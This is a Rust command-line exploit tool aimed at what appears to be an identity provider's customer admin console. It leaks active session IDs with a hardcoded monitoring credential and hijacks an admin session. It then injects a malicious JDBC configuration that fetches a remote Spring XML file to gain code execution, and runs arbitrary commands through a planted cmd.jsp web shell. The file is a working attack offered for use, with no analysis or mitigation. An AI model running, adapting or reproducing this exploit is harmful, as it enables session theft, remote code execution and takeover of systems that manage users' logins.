use clap::Parser;
use regex::Regex;
use reqwest::blocking::Client;
use reqwest_cookie_store::CookieStoreMutex;
use std::{collections::HashSet, error::Error, sync::Arc, thread};
use url::Url;

#[derive(thiserror::Error, Debug, Clone)]
pub enum SploitError {
    #[error("No valid customer admin sessions found")]
    NoValidSessions,

    #[error("Couldn't find a CSRF token in page")]
    NoCSRFToken,

    #[error("Failed to add malicious database object")]
    DatabaseAddFailed,

    #[error("Failed to trigger RCE by testing database")]
    DatabaseTriggerFailed,

    #[error("Command shell failed to execute")]
    CmdShellFailed,
}

struct Sploit {
    target: Url,
    client: Arc<Client>,
}

impl Sploit {
    fn new(target: &str) -> Result<Self, Box<dyn Error>> {
        // Some default client for now
        let client = Client::builder()
            .user_agent("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36")
            .cookie_store(true) // Enable cookies
            .build()
            .unwrap();
        let client = Arc::new(client);

        Ok(Sploit {
            target: Url::parse(target)?,
            client,
        })
    }

    fn leak_sessions(&self) -> Result<Vec<String>, Box<dyn Error>> {
        let mut sessions = HashSet::new();
        let re = Regex::new(r"([a-z0-9]{32})").unwrap();

        let url = self.target.join("/monitoring")?;
        let resp = Client::new()
            .get(url)
            .header(
                "Authorization",
                "Basic bW9hZG1pbmlkcDpQQHNzdzByZCQ5ODcxMjM=",
            )
            .query(&[
                ("part", "cacheKeys"),
                ("cacheId", "shiro-activeSessionCache"),
            ])
            .send()?
            .text()?;

        for capture in re.captures_iter(&resp) {
            sessions.insert(capture[0].to_string());
        }

        Ok(sessions.into_iter().collect())
    }

    pub fn impersonate_admin(&mut self) -> Result<(), Box<dyn Error>> {
        let possible_sessions = self.leak_sessions()?;
        let url = self.target.join("/admin/customer/home")?;

        for i in possible_sessions {
            // Set the session cookie to test
            let cookies = CookieStoreMutex::default();
            cookies
                .lock()
                .unwrap()
                .parse(format!("JSESSIONID={}", i).as_ref(), &self.target)?;
            let cookies = Arc::new(cookies);

            // Build http client
            let client = Client::builder()
                .user_agent("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36")
                .redirect(reqwest::redirect::Policy::none())
                .cookie_provider(cookies)
                .build()?;

            // pew pew
            let resp = client
                .get(url.as_ref())
                .header("Cookies", format!("JSESSIONID={};", i))
                .send()?;

            // am god?
            if resp.status() == 200 {
                // probably

                // Replace the sploit client with our authenticated one
                self.client = Arc::new(client);
                return Ok(());
            }
        }
        Err(Box::new(SploitError::NoValidSessions))
    }

    pub fn add_malicious_database(&self) -> Result<(), Box<dyn Error>> {
        let url = self.target.join("/admin/customer/savedatabaseidpconfig")?;
        let csrf_token = self.get_csrf_token()?;
        let payload = format!("struts.token.name=token&token={}&idpConfiguration.identifier=hax123&idpConfiguration.databaseType=PGSQL&idpConfiguration.databaseHost=jdbc%3Apostgresql%3A%2F%2Fhost.docker.internal%3A8899%2Fblah%3FsocketFactory%3Dorg.springframework.context.support.FileSystemXmlApplicationContext%26socketFactoryArg%3Dhttp%3A%2F%2Fhost.docker.internal%3A8000%2Ftrigger.xml&idpConfiguration.databaseAdminUsername=admin&idpConfiguration.databaseAdminPassword=admin&idpConfiguration.databaseUserTablename=users&idpConfiguration.databaseUsernameColumn=username&idpConfiguration.databasePasswordColumn=password&idpConfiguration.databaseactiveusers=&__checkbox_idpConfiguration.endUserLogin=true&__checkbox_idpConfiguration.databaseSyncUsers=true&idpConfiguration.databaseHashing=None&idpConfiguration.domainMapping=&__checkbox_idpConfiguration.databaseAuthenticationViaMiniorange=true&__checkbox_idpConfiguration.sendConfiguredAttributes=true&QueryStringsMapping%5B%27check_user_query%27%5D=&QueryStringsMapping%5B%27create_user_query%27%5D=&QueryStringsMapping%5B%27update_user_query%27%5D=&QueryStringsMapping%5B%27delete_user_query%27%5D=&save=Save", csrf_token);
        let resp = self
            .client
            .post(url)
            .body(payload)
            .header("Content-Type", "application/x-www-form-urlencoded")
            .send()?;
        if resp.status() != 200 {
            println!("Failed: Status {}", resp.status());
            return Err(Box::new(SploitError::DatabaseAddFailed));
        }
        Ok(())
    }

    pub fn trigger_rce(&self) -> Result<(), Box<dyn Error>> {
        let url = self
            .target
            .join("/admin/customer/testdatabaseconfiguration")?;
        let csrf_token = self.get_csrf_token()?;
        let payload = format!(
            "testIdentifier=hax123&struts.token.name=token&token={}&testUsername=a&testPassword=a",
            csrf_token
        );
        let resp = self
            .client
            .post(url)
            .body(payload)
            .header("Content-Type", "application/x-www-form-urlencoded")
            .send()?;
        if resp.status() != 200 {
            println!("Failed: Status {}", resp.status());
            return Err(Box::new(SploitError::DatabaseTriggerFailed));
        }
        Ok(())
    }

    pub fn get_csrf_token(&self) -> Result<String, Box<dyn Error>> {
        let re = Regex::new(r"([A-Z0-9]{32})").unwrap();
        let url = self.target.join("/admin/customer/listuserstores")?;
        let resp = self.client.get(url).send()?.text()?;
        match re.captures(&resp) {
            Some(caps) => match caps.get(0) {
                Some(cap) => {
                    return Ok(cap.as_str().to_owned());
                }
                None => return Err(Box::new(SploitError::NoCSRFToken)),
            },
            None => return Err(Box::new(SploitError::NoCSRFToken)),
        }
    }

    pub fn run_cmd(&self, cmd: &str) -> Result<String, Box<dyn Error>> {
        let url = self.target.join("/idp/cmd.jsp")?;
        let client = Client::builder()
            .user_agent("curl/7.79.1")
            .redirect(reqwest::redirect::Policy::none())
            .build()?;
        let resp = client
            .post(url)
            .body(format!("cmd={}", cmd))
            .header("Content-Type", "application/x-www-form-urlencoded")
            .send()?;

        if resp.status() != 200 {
            return Err(Box::new(SploitError::CmdShellFailed));
        }
        Ok(resp.text()?)
    }
}

#[derive(Parser, Debug)]
#[clap(author,version,about,long_about=None)]
struct Args {
    #[clap(short, long, value_parser)]
    target: String,

    #[clap(short, long, value_parser)]
    cmd: String,

    #[clap(short, long, value_parser)]
    nopwn: bool,
}

fn main() -> Result<(), Box<dyn Error>> {
    let args = Args::parse();
    let mut sploit = Sploit::new(&args.target)?;
    if !args.nopwn {
        println!("[*] Searching for admin sessions");
        sploit.impersonate_admin()?;
        println!("[*] Adding malicious jdbc");
        sploit.add_malicious_database()?;
        println!("[*] Triggering connection");
        sploit.trigger_rce()?;
        // This sleep seems to be required. If we try to access the shell too quickly, sometimes
        // we get back a 200 but with no response body.
        thread::sleep_ms(2000);
        println!("[*] pop pop");
    }
    let output = sploit.run_cmd(&args.cmd)?;
    println!("{}", output);
    Ok(())
}
